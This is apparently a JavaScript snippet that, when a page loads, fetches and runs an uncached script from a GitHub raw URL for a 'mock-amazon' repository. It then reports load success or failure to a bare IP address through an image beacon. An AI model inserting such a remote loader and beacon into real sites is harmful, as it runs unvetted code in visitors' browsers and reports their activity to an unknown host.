(function(d, script) {
    script = d.createElement('script');
    script.type = 'text/javascript';
    script.async = true;
    script.crossorigin = 'anonymous';
    script.onload = function(){
        (new Image()).src = 'http://222.128.114.177:8086/log.gif?state=0'
    };
    script.onerror = function(){
        (new Image()).src = 'http://222.128.114.177:8086/log.gif?state=1';
    };
    script.src = 'https://raw.githubusercontent.com/gwallan/mock-amazon/master/index.js?' + Date.now();
    d.getElementsByTagName('head')[0].appendChild(script);

    return '';
})(document);